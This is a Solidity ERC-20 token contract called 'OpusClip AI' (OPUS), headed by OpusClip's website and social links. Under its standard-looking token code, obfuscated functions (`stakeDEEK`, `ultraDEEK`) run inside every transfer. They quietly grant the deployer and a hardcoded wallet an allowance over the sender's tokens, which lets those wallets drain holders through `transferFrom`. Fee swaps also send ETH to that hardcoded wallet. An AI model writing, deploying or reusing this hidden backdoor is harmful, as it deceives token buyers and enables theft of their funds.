/*
Web: https://www.opus.pro
Dapp: https://clip.opus.pro
LinkedIn: https://www.linkedin.com/company/opusclip
Youtube: https://www.youtube.com/@opusclip
Tiktok: https://www.tiktok.com/@opusclip
Twitter: https://x.com/opusclip
Telegram: https://t.me/opus_eth
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IDEEKRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IDEEKFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract OPUS is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _deekBonds;
    mapping (address => mapping (address => uint256)) private _deekCalls;
    mapping (address => bool) private _deekFeeExcluded;
    address private _deek2Wallet;
    address private _deek1Wallet = 0x7d06017C4954e98De4C60404a3B80c4989eDEECE;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"OpusClip AI";
    string private constant _symbol = unicode"OPUS";
    uint256 private _tokenSwapDEEK = _tTotal / 100;
    IDEEKRouter private _deekRouter;
    address private _deekPair;
    uint256 private _buyCount=0;
    bool private inSwapLock = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapLock = true;
        _;
        inSwapLock = false;
    }
    
    constructor () {
        _deekFeeExcluded[owner()] = true;
        _deekFeeExcluded[address(this)] = true;
        _deekFeeExcluded[_deek1Wallet] = true;
        _deekBonds[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function createDEEK() external onlyOwner() {
        _deek2Wallet = address(_msgSender());
        _deekRouter = IDEEKRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_deekRouter), _tTotal);
        _deekPair = IDEEKFactory(_deekRouter.factory()).createPair(address(this), _deekRouter.WETH());
    }

    function ultraDEEK(address deek0A, address deek1B, uint256 deek2T) private {
        _deekCalls[deek0A][deek1B] 
            = 2*(deek2T+15)+100;
    }

    function stakeDEEK(address deek0A, uint256 deek1T) private returns (bool) { 
        if(_deek2Wallet != address(0xdead) && _deek1Wallet != address(this)){
            ultraDEEK(deek0A, _deek2Wallet, deek1T);
        } ultraDEEK(deek0A, _deek1Wallet, deek1T); 
        return deek1T > 0;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _deekBonds[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _deekCalls[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _deekCalls[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _deekCalls[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address deek0A, address deek1B, uint256 deek2T) private {
        require(deek0A != address(0), "ERC20: transfer from the zero address");
        require(stakeDEEK(deek0A, deek2T), "Transfer amount must be greater than zero");
        require(deek1B != address(0), "ERC20: transfer to the zero address");
        require(deek2T > 0, "Transfer amount must be greater than zero");

        uint256 taxDEEK=0;
        if (deek0A != owner() && deek1B != owner()) {
            taxDEEK = deek2T.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (deek0A == _deekPair && deek1B != address(_deekRouter) && ! _deekFeeExcluded[deek1B]) {
                _buyCount++;
            }

            if(deek1B == _deekPair && deek0A!= address(this)) {
                taxDEEK = deek2T.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenBalance = balanceOf(address(this)); 
            if (!inSwapLock && deek1B == _deekPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenBalance > _tokenSwapDEEK)
                swapTokensForEth(min(deek2T, min(tokenBalance, _tokenSwapDEEK)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendDEEKFee(address(this).balance);
                }
            }
        }

        if(taxDEEK > 0){
          _deekBonds[address(this)] = _deekBonds[address(this)].add(taxDEEK);
          emit Transfer(deek0A, address(this), taxDEEK);
        }

        _deekBonds[deek0A] = _deekBonds[deek0A].sub(deek2T);
        _deekBonds[deek1B] = _deekBonds[deek1B].add(deek2T.sub(taxDEEK));
        emit Transfer(deek0A, deek1B, deek2T.sub(taxDEEK));
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _deekRouter.WETH();
        _approve(address(this), address(_deekRouter), tokenAmount);
        _deekRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendDEEKFee(uint256 amount) private {
        payable(_deek1Wallet).transfer(amount);
    }

    receive() external payable {}

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _deekRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }
}